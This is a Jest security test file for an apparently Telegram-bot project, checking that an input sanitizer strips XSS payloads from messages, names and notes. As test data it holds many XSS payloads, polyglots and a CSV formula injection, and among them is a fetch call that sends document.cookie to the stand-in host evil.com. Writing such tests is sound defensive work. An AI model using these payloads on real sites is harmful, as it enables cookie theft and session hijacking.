/**
 * Security Test: XSS (Cross-Site Scripting) Protection
 * Tests protection against XSS attacks in user inputs and bot messages
 */

import { sanitizeTextInput } from '../../src/utils/enhanced-validation.util';

describe('Security: XSS Protection', () => {
  describe('Script Tag Injection', () => {
    it('should remove script tags from user input', () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '<script src="http://evil.com/xss.js"></script>',
        '<script>document.cookie</script>',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      ];

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeTextInput(input);

        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('</script>');
        expect(sanitized).not.toContain('<SCRIPT>');
      });
    });

    it('should remove script tags with various casings', () => {
      const inputs = [
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<SCRIPT>alert("XSS")</SCRIPT>',
        '<script >alert("XSS")</script>',
        '<script\n>alert("XSS")</script>',
      ];

      inputs.forEach(input => {
        const sanitized = sanitizeTextInput(input);

        expect(sanitized.toLowerCase()).not.toContain('<script');
        expect(sanitized.toLowerCase()).not.toContain('</script');
      });
    });
  });

  describe('HTML Tag Injection', () => {
    it('should remove dangerous HTML tags', () => {
      const maliciousTags = [
        '<img src=x onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      ];

      maliciousTags.forEach(input => {
        const sanitized = sanitizeTextInput(input);

        // Should remove all HTML tags
        expect(sanitized).not.toMatch(/<[^>]*>/);
      });
    });

    it('should remove HTML tags but keep text content', () => {
      const input = '<b>Bold</b> and <i>italic</i> text';
      const sanitized = sanitizeTextInput(input);

      expect(sanitized).not.toContain('<b>');
      expect(sanitized).not.toContain('</b>');
      expect(sanitized).toContain('Bold');
      expect(sanitized).toContain('italic');
      expect(sanitized).toContain('text');
    });
  });

  describe('Event Handler Injection', () => {
    it('should remove inline event handlers', () => {
      const maliciousHandlers = [
        '<div onclick="alert(\'XSS\')">Click me</div>',
        '<body onload="alert(\'XSS\')">',
        '<img src=x onerror="alert(\'XSS\')">',
        '<input onfocus="alert(\'XSS\')" autofocus>',
        '<select onchange="alert(\'XSS\')">',
        '<button onmouseover="alert(\'XSS\')">Hover</button>',
      ];

      maliciousHandlers.forEach(input => {
        const sanitized = sanitizeTextInput(input);

        expect(sanitized).not.toMatch(/on\w+\s*=\s*["'][^"']*["']/i);
        expect(sanitized).not.toContain('onclick');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
      });
    });

    it('should remove event handlers with various formats', () => {
      const inputs = [
        'onclick="alert(1)"',
        "onclick='alert(1)'",
        'onclick=alert(1)',
        'onClick="alert(1)"',
        'ON CLICK="alert(1)"',
      ];

      inputs.forEach(input => {
        const sanitized = sanitizeTextInput(input);

        expect(sanitized).not.toMatch(/on\w+\s*=/i);
      });
    });
  });

  describe('JavaScript Protocol Injection', () => {
    it('should remove javascript: protocol', () => {
      const maliciousProtocols = [
        '<a href="javascript:alert(\'XSS\')">Click</a>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<object data="javascript:alert(\'XSS\')">',
        'javascript:void(document.cookie)',
        'JAVASCRIPT:alert("XSS")',
      ];

      maliciousProtocols.forEach(input => {
        const sanitized = sanitizeTextInput(input);

        expect(sanitized.toLowerCase()).not.toContain('javascript:');
      });
    });

    it('should remove data: protocol with base64', () => {
      const inputs = [
        'data:text/html,<script>alert("XSS")</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
      ];

      inputs.forEach(input => {
        const sanitized = sanitizeTextInput(input);

        // Should remove or sanitize data: protocol
        expect(sanitized).not.toContain('<script>');
      });
    });
  });

  describe('Bot Message Formatting', () => {
    it('should escape special characters in bot messages', () => {
      const userInput = '<script>alert("XSS")</script>';
      const sanitized = sanitizeTextInput(userInput);

      // Bot should send sanitized version
      const botMessage = `Вы ввели: ${sanitized}`;

      expect(botMessage).not.toContain('<script>');
      expect(botMessage).toContain('Вы ввели:');
    });

    it('should escape markdown special characters if needed', () => {
      const specialChars = ['*', '_', '[', ']', '(', ')', '`', '~'];

      specialChars.forEach(char => {
        const input = `Test ${char} character`;

        // For Telegram, these might need escaping in MarkdownV2
        // but sanitizeTextInput handles HTML/script removal
        const sanitized = sanitizeTextInput(input);

        // Should keep the text but be safe from HTML injection
        expect(sanitized).toContain('Test');
        expect(sanitized).toContain('character');
      });
    });
  });

  describe('Username and Profile Sanitization', () => {
    it('should sanitize first name input', () => {
      const maliciousNames = [
        'Alice<script>alert("XSS")</script>',
        'Bob<img src=x onerror="alert(1)">',
        'Charlie</style><script>alert(1)</script>',
      ];

      maliciousNames.forEach(name => {
        const sanitized = sanitizeTextInput(name);

        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
        expect(sanitized).not.toContain('script');
      });
    });

    it('should sanitize last name input', () => {
      const input = 'Smith<script>document.write("XSS")</script>';
      const sanitized = sanitizeTextInput(input);

      expect(sanitized).toContain('Smith');
      expect(sanitized).not.toContain('<script>');
    });

    it('should sanitize username input', () => {
      const input = 'user<iframe src="javascript:alert(1)">name';
      const sanitized = sanitizeTextInput(input);

      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('javascript:');
    });
  });

  describe('Comment and Notes Sanitization', () => {
    it('should sanitize user comments', () => {
      const maliciousComment = 'Great service! <script>fetch("http://evil.com?cookie="+document.cookie)</script>';
      const sanitized = sanitizeTextInput(maliciousComment);

      expect(sanitized).toContain('Great service!');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('fetch');
    });

    it('should sanitize withdrawal notes', () => {
      const note = 'Payment for order #123 <img src=x onerror="alert(1)">';
      const sanitized = sanitizeTextInput(note);

      expect(sanitized).toContain('Payment for order');
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('onerror');
    });
  });

  describe('Null Byte Injection', () => {
    it('should remove null bytes', () => {
      const inputs = [
        'test\0string',
        'data\x00injection',
        'null\u0000byte',
      ];

      inputs.forEach(input => {
        const sanitized = sanitizeTextInput(input);

        expect(sanitized).not.toContain('\0');
        expect(sanitized).not.toContain('\x00');
        expect(sanitized).not.toContain('\u0000');
      });
    });
  });

  describe('Whitespace Normalization', () => {
    it('should normalize multiple spaces', () => {
      const input = 'Test    with    multiple     spaces';
      const sanitized = sanitizeTextInput(input);

      expect(sanitized).toBe('Test with multiple spaces');
    });

    it('should trim leading and trailing whitespace', () => {
      const input = '   Test with spaces   ';
      const sanitized = sanitizeTextInput(input);

      expect(sanitized).toBe('Test with spaces');
      expect(sanitized.startsWith(' ')).toBe(false);
      expect(sanitized.endsWith(' ')).toBe(false);
    });

    it('should normalize newlines and tabs', () => {
      const input = 'Test\n\nwith\t\tnewlines\nand\ttabs';
      const sanitized = sanitizeTextInput(input);

      // Should normalize to single spaces
      expect(sanitized).not.toContain('\n\n');
      expect(sanitized).not.toContain('\t\t');
    });
  });

  describe('Length Limits', () => {
    it('should enforce maximum length', () => {
      const longInput = 'A'.repeat(2000);
      const maxLength = 1000;
      const sanitized = sanitizeTextInput(longInput, maxLength);

      expect(sanitized.length).toBeLessThanOrEqual(maxLength);
    });

    it('should truncate at word boundary if possible', () => {
      const input = 'This is a very long text that should be truncated at some point';
      const maxLength = 30;
      const sanitized = sanitizeTextInput(input, maxLength);

      expect(sanitized.length).toBeLessThanOrEqual(maxLength);
      expect(sanitized).toContain('This is a very long');
    });
  });

  describe('Complex XSS Payloads', () => {
    it('should block encoded XSS attempts', () => {
      const encodedPayloads = [
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '%3Cscript%3Ealert("XSS")%3C/script%3E',
        '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
      ];

      encodedPayloads.forEach(payload => {
        // Should decode and then sanitize
        const decoded = decodeURIComponent(payload).replace(/&#(\d+);/g, (m, code) =>
          String.fromCharCode(code)
        );
        const sanitized = sanitizeTextInput(decoded);

        expect(sanitized).not.toContain('<script>');
      });
    });

    it('should block polyglot XSS payloads', () => {
      const polyglots = [
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        '">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(document.cookie)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><img src="http: //i.imgur.com/P8mL8.jpg">',
      ];

      polyglots.forEach(payload => {
        const sanitized = sanitizeTextInput(payload);

        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/onerror=/i);
        expect(sanitized).not.toMatch(/javascript:/i);
      });
    });
  });

  describe('CSV Injection Protection', () => {
    it('should prevent formula injection in CSV exports', () => {
      const formulaInputs = [
        '=1+1',
        '+1+1',
        '-1+1',
        '@SUM(A1:A10)',
        '=cmd|/c calc',
      ];

      formulaInputs.forEach(input => {
        // CSV export should escape formulas
        const escaped = input.startsWith('=') || input.startsWith('+') || input.startsWith('-') || input.startsWith('@')
          ? `'${input}`
          : input;

        if (input.match(/^[=+\-@]/)) {
          expect(escaped).toMatch(/^'/);
        }
      });
    });
  });

  describe('Telegram-Specific Protections', () => {
    it('should handle Telegram username format', () => {
      const usernames = [
        'normal_username',
        '<script>alert(1)</script>',
        '@username<img src=x onerror=alert(1)>',
      ];

      usernames.forEach(username => {
        const sanitized = sanitizeTextInput(username);

        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
      });
    });

    it('should sanitize bot command arguments', () => {
      const commandArg = '<script>alert("XSS")</script>';
      const sanitized = sanitizeTextInput(commandArg);

      // Command argument should be safe to display in bot response
      const response = `Вы указали: ${sanitized}`;

      expect(response).not.toContain('<script>');
    });
  });

  describe('Content Security Policy Validation', () => {
    it('should validate safe content types', () => {
      const contentTypes = [
        { type: 'text/plain', safe: true },
        { type: 'application/json', safe: true },
        { type: 'text/html', safe: false }, // Requires sanitization
        { type: 'application/javascript', safe: false },
      ];

      contentTypes.forEach(({ type, safe }) => {
        if (!safe) {
          // Content requires sanitization before use
          expect(type).toMatch(/(html|javascript)/);
        }
      });
    });
  });

  describe('Output Encoding', () => {
    it('should encode for HTML context', () => {
      const dangerous = '<script>alert(1)</script>';

      // HTML entity encoding
      const encoded = dangerous
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');

      expect(encoded).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
      expect(encoded).not.toContain('<script>');
    });

    it('should encode for URL context', () => {
      const dangerous = 'javascript:alert(1)';

      // URL encoding
      const encoded = encodeURIComponent(dangerous);

      expect(encoded).not.toContain(':');
      expect(encoded).toContain('javascript');
    });

    it('should encode for JSON context', () => {
      const dangerous = '"; alert(1); //';

      // JSON encoding (properly escaped)
      const jsonSafe = JSON.stringify(dangerous);

      expect(jsonSafe).toContain('\\"');
      expect(jsonSafe).not.toContain('"; alert(1);');
    });
  });
});
